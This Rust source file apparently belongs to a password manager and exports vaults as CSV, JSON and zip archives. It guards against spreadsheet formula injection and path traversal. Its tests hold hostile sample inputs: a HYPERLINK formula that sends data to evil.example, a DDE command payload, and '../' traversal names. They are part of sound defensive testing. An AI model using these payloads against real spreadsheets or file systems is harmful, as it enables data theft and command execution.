//! Unencrypted exports, for moving to another password manager.
//!
//! - CSV in Bitwarden's layout (`folder,favorite,type,name,notes,fields,
//!   reprompt,login_uri,login_username,login_password,login_totp`), which
//!   Bitwarden, 1Password and Keyless import. Items that are not logins are
//!   written as notes with their fields in the `fields` column, so nothing is
//!   lost.
//! - JSON with every item as Keyless stores it.
//! - A zip archive with that JSON (`keyless-export.json`) and the attached
//!   files in `attachments/<attachment id>/<name>`, as Bitwarden lays them
//!   out; each attachment in the JSON names its file.
//!
//! Both hold every secret in plain text: the app asks for the master password
//! and warns before writing one.
//!
//! A CSV cell a spreadsheet would run as a formula (a website can choose an
//! item's title and user name when it saves a passkey) is written with a
//! leading `'`, which Keyless removes again on import. Passwords, one-time
//! password secrets and notes are written as they are.

use std::{
    collections::HashMap,
    io::{Seek, Write},
};

use serde::Serialize;
use zip::{CompressionMethod, write::SimpleFileOptions};

use crate::{
    Error, Result,
    attachment::{Attachment, clean_name},
    backup::BackupData,
    item::{Category, Field, FieldKind, FieldPurpose, ItemDetails, ItemOverview},
};

const CSV_HEADER: [&str; 11] =
    ["folder", "favorite", "type", "name", "notes", "fields", "reprompt", "login_uri", "login_username", "login_password", "login_totp"];

/// One line per value: a field's value may not contain line breaks in the
/// `fields` column.
fn one_line(value: &str) -> String {
    value.split(['\r', '\n']).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ")
}

/// Whether a spreadsheet would read `value` as a formula that can run
/// something or send data out: anything starting with `=`, and `+`, `-` or
/// `@` followed by a function call or a link to another program. Phone
/// numbers (`+55 11 …`) and handles (`@name`) are left alone.
fn formula(value: &str) -> bool {
    let call = || {
        value.match_indices('(').any(|(i, _)| value[..i].trim_end().chars().next_back().is_some_and(|c| c.is_ascii_alphabetic() || c == '_' || c == '.'))
    };
    match value.chars().next() {
        Some('=' | '\t' | '\r') => true,
        Some('+' | '-' | '@') => value.contains('|') || call(),
        _ => false,
    }
}

/// `value` as a spreadsheet shows it, never run.
fn spreadsheet_safe(value: String) -> String {
    if formula(&value) { format!("'{value}") } else { value }
}

/// Undoes [`spreadsheet_safe`] for a cell read back.
pub(crate) fn from_spreadsheet(value: String) -> String {
    match value.strip_prefix('\'') {
        Some(rest) if formula(rest) => rest.to_string(),
        _ => value,
    }
}

fn row(overview: &ItemOverview, details: &ItemDetails) -> [String; 11] {
    let login = matches!(overview.category, Category::Login | Category::Password);
    let username = details.field_by_purpose(FieldPurpose::Username);
    let password = details.field_by_purpose(FieldPurpose::Password);
    let totp = details.all_fields().find(|f| f.kind == FieldKind::Totp && !f.value.is_empty());
    let main = |f: &Field| login && [username, password, totp].iter().any(|m| m.is_some_and(|m| std::ptr::eq(m, f)));
    let fields = details
        .all_fields()
        .filter(|f| !f.value.is_empty() && !main(f))
        .map(|f| format!("{}: {}", one_line(&f.label), one_line(&f.value)))
        .collect::<Vec<_>>()
        .join("\n");
    let value = |field: Option<&Field>| if login { field.map(|f| f.value.clone()).unwrap_or_default() } else { String::new() };
    [
        spreadsheet_safe(overview.tags.join(", ")),
        if overview.favorite { "1".into() } else { String::new() },
        if login { "login".into() } else { "note".into() },
        spreadsheet_safe(overview.title.clone()),
        details.notes.clone(),
        spreadsheet_safe(fields),
        "0".into(),
        spreadsheet_safe(overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>().join(",")),
        spreadsheet_safe(value(username)),
        value(password),
        value(totp),
    ]
}

pub fn to_csv(data: &BackupData) -> Result<Vec<u8>> {
    let mut writer = csv::Writer::from_writer(Vec::new());
    let fail = |e: csv::Error| Error::Import(format!("CSV export failed: {e}"));
    writer.write_record(CSV_HEADER).map_err(fail)?;
    for item in data.vaults.iter().flat_map(|v| &v.items) {
        writer.write_record(row(&item.overview, &item.details)).map_err(fail)?;
    }
    writer.into_inner().map_err(|e| Error::Import(format!("CSV export failed: {e}")))
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct JsonExport<'a> {
    format: &'static str,
    version: u32,
    #[serde(flatten)]
    data: &'a BackupData,
}

pub fn to_json(data: &BackupData) -> Result<Vec<u8>> {
    json_with_files(data, &HashMap::new())
}

/// The JSON export; attachments in `files` (by id) name their file in the
/// archive.
fn json_with_files(data: &BackupData, files: &HashMap<String, String>) -> Result<Vec<u8>> {
    let mut value = serde_json::to_value(JsonExport { format: "keyless-export", version: 1, data })?;
    // The files are not encrypted in an export, so their keys mean nothing.
    // (`get_mut`, not indexing: indexing adds the key when it is missing.)
    for vault in value.get_mut("vaults").and_then(serde_json::Value::as_array_mut).into_iter().flatten() {
        for item in vault.get_mut("items").and_then(serde_json::Value::as_array_mut).into_iter().flatten() {
            let attachments = item.get_mut("details").and_then(|d| d.get_mut("attachments")).and_then(serde_json::Value::as_array_mut);
            for attachment in attachments.into_iter().flatten() {
                if let Some(entry) = attachment.as_object_mut() {
                    entry.remove("key");
                    let path = entry.get("id").and_then(|id| id.as_str()).and_then(|id| files.get(id));
                    if let Some(path) = path.cloned() {
                        entry.insert("file".into(), path.into());
                    }
                }
            }
        }
    }
    serde_json::to_vec_pretty(&value).map_err(Error::from)
}

/// Writes the zip export: the attached files first, as they are downloaded
/// and decrypted, then the JSON.
pub struct ExportZip<W: Write + Seek> {
    zip: zip::ZipWriter<W>,
    /// The path of each attachment's file written whole, by attachment id.
    written: HashMap<String, String>,
    /// The file being written: attachment id and path.
    current: Option<(String, String)>,
}

impl<W: Write + Seek> ExportZip<W> {
    pub fn new(out: W) -> Self {
        Self { zip: zip::ZipWriter::new(out), written: HashMap::new(), current: None }
    }

    fn fail(e: impl std::fmt::Display) -> Error {
        Error::Import(format!("could not write the export: {e}"))
    }

    /// Starts `attachment`'s file; its contents follow, then
    /// [`ExportZip::end_file`] or [`ExportZip::abort_file`].
    pub fn start_file(&mut self, attachment: &Attachment) -> Result<()> {
        // The folder is named after the attachment only when its id is what
        // Keyless makes (another vault member could have chosen any text).
        let folder = match uuid::Uuid::parse_str(&attachment.id) {
            Ok(id) => id.hyphenated().to_string(),
            Err(_) => uuid::Uuid::new_v4().to_string(),
        };
        let path = format!("attachments/{folder}/{}", clean_name(&attachment.name));
        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .large_file(attachment.size >= u32::MAX as u64);
        self.zip.start_file(path.as_str(), options).map_err(Self::fail)?;
        self.current = Some((attachment.id.clone(), path));
        Ok(())
    }

    pub fn write(&mut self, plaintext: &[u8]) -> Result<()> {
        self.zip.write_all(plaintext).map_err(Self::fail)
    }

    /// The file started last is complete.
    pub fn end_file(&mut self) {
        if let Some((id, path)) = self.current.take() {
            self.written.insert(id, path);
        }
    }

    /// Leaves out the file being written (it could not be read whole), if
    /// one is (the zip writer would otherwise drop the one before).
    pub fn abort_file(&mut self) -> Result<()> {
        match self.current.take() {
            Some(_) => self.zip.abort_file().map_err(Self::fail),
            None => Ok(()),
        }
    }

    /// Writes the JSON and ends the archive.
    pub fn finish(mut self, data: &BackupData) -> Result<W> {
        let json = zeroize::Zeroizing::new(json_with_files(data, &self.written)?);
        let options = SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
        self.zip.start_file("keyless-export.json", options).map_err(Self::fail)?;
        self.zip.write_all(&json).map_err(Self::fail)?;
        self.zip.finish().map_err(Self::fail)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        backup::{BackupItem, BackupVault},
        import::csv::parse_csv,
        item::ItemUrl,
    };

    fn field(label: &str, kind: FieldKind, value: &str, purpose: Option<FieldPurpose>) -> Field {
        Field { id: label.into(), label: label.into(), kind, value: value.into(), purpose }
    }

    fn sample() -> BackupData {
        let mut login = ItemDetails::default();
        login.fields = vec![
            field("username", FieldKind::Text, "ana@example.com", Some(FieldPurpose::Username)),
            field("password", FieldKind::Concealed, "p,a\"ss\nword", Some(FieldPurpose::Password)),
            field("one-time password", FieldKind::Totp, "otpauth://totp/x?secret=JBSWY3DPEHPK3PXP", None),
            field("recovery", FieldKind::Concealed, "code-1\ncode-2", None),
        ];
        login.notes = "first line\nsecond line".into();
        let mut card = ItemDetails::default();
        card.fields = vec![field("number", FieldKind::CardNumber, "4111111111111111", None), field("expiry date", FieldKind::MonthYear, "05/2027", None)];
        BackupData {
            exported_at: 1,
            vaults: vec![BackupVault {
                name: "Personal".into(),
                description: String::new(),
                items: vec![
                    BackupItem {
                        overview: ItemOverview {
                            title: "Example".into(),
                            category: Category::Login,
                            urls: vec![ItemUrl { href: "https://example.com".into(), ..Default::default() }, ItemUrl { href: "https://example.org".into(), ..Default::default() }],
                            tags: vec!["work".into()],
                            favorite: true,
                            ..Default::default()
                        },
                        details: login,
                    },
                    BackupItem { overview: ItemOverview { title: "Visa".into(), category: Category::CreditCard, ..Default::default() }, details: card },
                ],
            }],
        }
    }

    #[test]
    fn csv_round_trip() {
        let csv = to_csv(&sample()).unwrap();
        let text = String::from_utf8(csv.clone()).unwrap();
        assert!(text.starts_with("folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n"));
        let imported = parse_csv(csv.as_slice(), "Personal").unwrap();
        let items = &imported.vaults[0].items;
        assert_eq!(items.len(), 2);
        let login = &items[0];
        assert_eq!(login.overview.title, "Example");
        assert!(login.overview.favorite);
        assert_eq!(login.overview.tags, ["work"]);
        assert_eq!(login.overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>(), ["https://example.com", "https://example.org"]);
        assert_eq!(login.details.password(), Some("p,a\"ss\nword"));
        assert_eq!(login.details.username(), Some("ana@example.com"));
        assert!(login.details.all_fields().any(|f| f.kind == FieldKind::Totp && f.value.starts_with("otpauth://")));
        assert!(login.details.all_fields().any(|f| f.label == "recovery" && f.value == "code-1 code-2"));
        assert_eq!(login.details.notes, "first line\nsecond line");
        let card = &items[1];
        assert_eq!(card.overview.category, Category::SecureNote);
        assert!(card.details.all_fields().any(|f| f.label == "number" && f.value == "4111111111111111"));
    }

    #[test]
    fn formulas_are_not_run() {
        for (value, escaped) in [
            ("=HYPERLINK(\"https://x/?\"&J5,\"x\")", true),
            ("+HYPERLINK(\"https://x\")", true),
            ("-cmd|' /C calc'!A0", true),
            ("@SUM(A1:A9)", true),
            ("\tx", true),
            ("+55 (11) 99999-9999", false),
            ("@diego", false),
            ("- shopping list", false),
            ("Example", false),
        ] {
            let safe = spreadsheet_safe(value.to_string());
            assert_eq!(safe.starts_with('\''), escaped, "{value}");
            assert_eq!(from_spreadsheet(safe), value);
        }

        let mut data = sample();
        let item = &mut data.vaults[0].items[0];
        item.overview.title = "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")".into();
        item.details.fields[0].value = "+SUM(1)".into();
        item.details.fields[1].value = "=not-a-formula-but-a-password".into();
        let csv = to_csv(&data).unwrap();
        let text = String::from_utf8(csv.clone()).unwrap();
        assert!(text.contains("\"'=HYPERLINK("));
        assert!(text.contains(",'+SUM(1),=not-a-formula-but-a-password,"));
        let imported = parse_csv(csv.as_slice(), "Personal").unwrap();
        let login = &imported.vaults[0].items[0];
        assert_eq!(login.overview.title, "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")");
        assert_eq!(login.details.username(), Some("+SUM(1)"));
        assert_eq!(login.details.password(), Some("=not-a-formula-but-a-password"));
    }

    #[test]
    fn json_has_everything() {
        let mut data = sample();
        data.vaults[0].items[0].details.attachments.push(crate::attachment::Attachment::new("scan.pdf", 10, 1).unwrap());
        let json: serde_json::Value = serde_json::from_slice(&to_json(&data).unwrap()).unwrap();
        assert_eq!(json["format"], "keyless-export");
        assert_eq!(json["vaults"][0]["items"][1]["details"]["fields"][1]["value"], "05/2027");
        // Attachments are listed, without their keys.
        let attachment = &json["vaults"][0]["items"][0]["details"]["attachments"][0];
        assert_eq!(attachment["name"], "scan.pdf");
        assert!(attachment.get("key").is_none());
        assert!(attachment.get("file").is_none());
        // Items without attachments do not get an empty list.
        assert!(json["vaults"][0]["items"][1]["details"].get("attachments").is_none());
    }

    #[test]
    fn zip_has_the_files() {
        use std::io::{Cursor, Read};

        let mut data = sample();
        let scan = Attachment::new("../scan.pdf", 4, 1).unwrap();
        let mut forged = Attachment::new("notes.txt", 2, 1).unwrap();
        forged.id = "../../outside".into();
        let lost = Attachment::new("lost.txt", 1, 1).unwrap();
        data.vaults[0].items[0].details.attachments = vec![scan.clone(), forged.clone(), lost.clone()];

        let mut export = ExportZip::new(Cursor::new(Vec::new()));
        export.start_file(&scan).unwrap();
        export.write(b"%PDF").unwrap();
        export.end_file();
        export.start_file(&forged).unwrap();
        export.write(b"hi").unwrap();
        export.end_file();
        export.start_file(&lost).unwrap();
        export.write(b"?").unwrap();
        export.abort_file().unwrap();
        // Nothing to abort: the files before stay.
        export.abort_file().unwrap();
        let file = export.finish(&data).unwrap().into_inner();

        let mut archive = zip::ZipArchive::new(Cursor::new(file)).unwrap();
        let names: Vec<String> = archive.file_names().map(String::from).collect();
        assert_eq!(names.len(), 3);
        assert!(names.iter().all(|n| !n.contains("..")), "{names:?}");
        let scan_path = format!("attachments/{}/scan.pdf", scan.id);
        let mut contents = String::new();
        archive.by_name(&scan_path).unwrap().read_to_string(&mut contents).unwrap();
        assert_eq!(contents, "%PDF");

        let mut json = String::new();
        archive.by_name("keyless-export.json").unwrap().read_to_string(&mut json).unwrap();
        let json: serde_json::Value = serde_json::from_str(&json).unwrap();
        let listed = json["vaults"][0]["items"][0]["details"]["attachments"].as_array().unwrap();
        assert_eq!(listed[0]["file"], scan_path.as_str());
        let forged_path = listed[1]["file"].as_str().unwrap();
        assert!(forged_path.starts_with("attachments/") && forged_path.ends_with("/notes.txt") && !forged_path.contains(".."));
        assert!(names.iter().any(|n| n == forged_path));
        // The file that could not be read is listed without one.
        assert!(listed[2].get("file").is_none());
        assert!(listed.iter().all(|a| a.get("key").is_none()));
    }
}
